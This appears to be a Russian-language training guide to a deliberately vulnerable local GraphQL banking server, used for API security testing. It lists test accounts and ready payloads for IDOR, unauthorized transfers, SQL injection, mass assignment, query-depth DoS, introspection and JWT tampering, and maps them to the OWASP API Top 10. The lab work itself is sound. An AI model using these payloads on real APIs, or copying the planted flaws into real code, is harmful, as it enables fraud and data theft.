# GraphQL сервер — карта уязвимостей для тестирования

Сервер: `server.js`, порт **3004**. Запуск: `npm install && npm start`
Playground / интроспекция: `http://localhost:3004/graphql`

Тестовые пользователи (username / password):
- `ivan_petrov` / `Passw0rd!` — user, id=1, счета id=1 (RUB), id=2 (USD)
- `anna_smirnova` / `QwertY123` — user, id=2, счёт id=3 (RUB)
- `admin` / `admin123` — admin, id=3, счёт id=4 (RUB)

---

## 1. IDOR — чтение чужого счёта (`account(id)`)
Нет проверки владения. Любой (даже без токена) может подставить чужой id.

```graphql
query {
  account(id: 3) {
    number
    balance
    owner { fullName }
    cards { number cvv }
  }
}
```
Ожидание по факту: возвращает счёт Анны, включая номер карты и CVV — без авторизации.

## 2. IDOR — чтение любого пользователя (`user(id)`)
```graphql
query { user(id: 3) { username fullName role } }
```

## 3. Broken Object Level Authorization в мутации `transfer`
`fromAccountId` не сверяется с владельцем токена — можно списать деньги с чужого счёта.
```graphql
mutation {
  transfer(fromAccountId: 3, toAccountId: 1, amount: 5000) {
    id amount description
  }
}
```

## 4. Отсутствие проверки баланса / race condition
`transfer` не проверяет `amount <= balance` — можно увести баланс в минус,
а при параллельных запросах — классическая гонка (как в вашем банковском REST API).

## 5. SQL Injection в `searchTransactions`
Строка конкатенируется напрямую в SQL:
```graphql
query { searchTransactions(query: "' OR '1'='1") { id description amount } }
```
Ошибка в `debug: true` дополнительно вернёт текст SQL-запроса в ответе — полезно
для демонстрации information disclosure.

## 6. Mass Assignment в `createCard`
Можно привязать новую карту к чужому `accountId`:
```graphql
mutation {
  createCard(accountId: 3, number: "1111 2222 3333 4444", cvv: "999", expiry: "01/30") {
    id number
  }
}
```

## 7. Excessive Data Exposure / отсутствие лимита вложенности
Глубокая вложенность не ограничена — потенциальный DoS через сложный запрос:
```graphql
query {
  users {
    accounts {
      transactions {
        account {
          transactions { id }
        }
      }
    }
  }
}
```

## 8. Introspection и Playground включены
`introspection: true` — злоумышленник может выгрузить всю схему без авторизации:
```graphql
query { __schema { types { name fields { name } } } }
```

## 9. Verbose errors (`debug: true`)
Ошибки резолверов возвращаются со stack trace / деталями SQL.

## 10. Нет rate limiting на `login`
Возможен brute-force подбор пароля — попробуйте прогнать словарь через Newman/Postman.

## 11. Слабый/захардкоженный JWT secret
`super-secret-bank-key` — можно попробовать подобрать/угадать секрет и подделать
токен (в т.ч. с `role: admin`), если вынести в отдельный вектор атаки (JWT tampering).

---

## Что можно сделать дальше (по плану обучения)
- Написать Postman/Newman коллекцию для GraphQL (как для REST) — включить кейсы 1–11 выше.
- Завести баг-репорты в TestRail/TestIT по каждой уязвимости (Severity/Priority по OWASP API Top 10).
- Сопоставить с OWASP API Security Top 10 2023: API1 (BOLA/IDOR), API3 (BOPLA/mass assignment),
  API5 (BFLA), API8 (Security Misconfiguration — introspection, debug), API4 (Unrestricted Resource Consumption — depth/rate limit).
